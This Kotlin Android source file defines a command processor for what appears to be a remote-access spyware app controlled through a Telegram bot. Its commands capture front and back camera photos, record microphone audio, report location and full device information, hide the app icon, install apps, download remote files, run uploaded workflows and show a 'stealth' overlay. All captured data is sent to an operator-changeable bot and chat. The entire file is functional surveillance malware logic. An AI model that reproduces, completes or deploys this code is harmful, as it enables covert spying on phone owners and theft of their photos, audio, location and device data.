package com.systemlinker.features

import android.content.Context
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.File

class CommandProcessor(
    private val context: Context,
    private val defaultBotToken: String, // Ignored, reads from ConfigStore
    private val defaultChatId: Long      // Ignored, reads from ConfigStore
) {
    private val configStore = ConfigStore(context)
    private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val workflowEngine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")

        // Always ensure uploader has latest dynamic config before executing
        uploader.botToken = configStore.botToken
        uploader.chatId = configStore.targetChatId

        processorScope.launch {
            try {
                when (cmd) {
                    // --- NEW CONFIGURATION COMMANDS ---
                    "set_bot_api" -> {
                        configStore.botToken = arg.trim()
                        uploader.botToken = configStore.botToken
                        uploader.sendText("✅ Bot API updated permanently.")
                    }
                    "set_target_chatid" -> {
                        configStore.targetChatId = arg.trim().toLongOrNull() ?: configStore.targetChatId
                        uploader.chatId = configStore.targetChatId
                        uploader.sendText("✅ Target Chat ID updated permanently.")
                    }
                    "set_overlay_duration" -> {
                        configStore.overlayDurationMs = arg.trim().toLongOrNull() ?: 3000L
                        uploader.sendText("Overlay duration set to ${configStore.overlayDurationMs}ms.")
                    }
                    "click_after_HS_switch" -> {
                        // Example arg: "home,2" or "app_launch"
                        val parts = arg.split(",")
                        configStore.postHotspotAction = parts[0].trim()
                        configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                        uploader.sendText("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
                    }
                    "set_overlay" -> {
                        uploader.sendText("⏳ Polling for 20 seconds. Please send an IMAGE now to set as the persistent overlay...")
                        val destFile = File(context.filesDir, "stealth_overlay.jpg")
                        val success = uploader.pollForFile(20, "photo", destFile)
                        if (success) uploader.sendText("✅ Overlay image received and saved successfully.")
                        else uploader.sendText("❌ Timeout. No image received.")
                    }

                    // --- WORKFLOW COMMANDS ---
                    "workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        uploader.sendText("⏳ Polling for 20s. Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
                        val destFile = File(context.filesDir, "$wfName.yml")
                        val success = uploader.pollForFile(20, "document", destFile)
                        if (success) {
                            uploader.sendText("✅ Workflow '$wfName' received. Executing...")
                            workflowEngine.executeWorkflow(wfName)
                        } else {
                            uploader.sendText("❌ Timeout. No workflow document received.")
                        }
                    }
                    "status_workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        workflowEngine.sendStatus(wfName)
                    }

                    // --- KEEPING ALL EXISTING COMMANDS INTACT ---
                    "ping" -> {
                        val bat = systemHandler.getBasicBatteryStatus()
                        uploader.sendText("🟢 Device Online\n$bat")
                    }
                    "cam_front" -> {
                        val file = mediaHandler.takePicture(isFront = true)
                        if (file != null) uploader.sendFile(file, "photo", "Front Camera")
                    }
                    "cam_back" -> {
                        val file = mediaHandler.takePicture(isFront = false)
                        if (file != null) uploader.sendFile(file, "photo", "Back Camera")
                    }
                    "mic" -> {
                        val duration = arg.toIntOrNull() ?: 15
                        val file = mediaHandler.recordAudio(duration)
                        if (file != null) uploader.sendFile(file, "audio", "Mic Record (${duration}s)")
                    }
                    "loc" -> uploader.sendText(systemHandler.getLocation())
                    "flash" -> uploader.sendText(systemHandler.setFlashlight(arg == "on"))
                    "vol" -> systemHandler.setVolume(arg.toIntOrNull() ?: 50)
                    "info" -> uploader.sendDocument(systemHandler.generateFullSystemReport(), "Full Device Intel Report", true)
                    "get_log" -> uploader.sendDocument(ErrorLogger.getLogFile(context), "SystemLinker Error Logs")
                    "clear_log" -> ErrorLogger.clearLogs(context)
                    "live_start" -> liveSessionManager.connect(arg.trim())
                    "live_stop" -> liveSessionManager.disconnect()
                    "install_app" -> systemHandler.installApp(arg)
                    "uninstall_app" -> systemHandler.uninstallApp(arg)
                    "icon_hide" -> uploader.sendText(systemHandler.setAppIconVisibility(false))
                    "icon_show" -> uploader.sendText(systemHandler.setAppIconVisibility(true))
                    "toggle_wifi" -> uploader.sendText(systemHandler.setWifiState(arg == "on"))
                    "toggle_bt" -> uploader.sendText(systemHandler.setBluetoothState(arg == "on"))
                    "toggle_hotspot" -> uploader.sendText(systemHandler.setHotspotState(arg == "on"))
                    "scan_wifi" -> uploader.sendText(systemHandler.getWifiScanResults())
                    "scan_bt" -> uploader.sendText(systemHandler.getBluetoothScanResults())
                    "download_url" -> {
                        try {
                            val json = JSONObject(arg)
                            uploader.sendText(systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", "")))
                        } catch (e: Exception) { }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                uploader.sendText("Execution failed for command: $cmd")
            }
        }
    }
}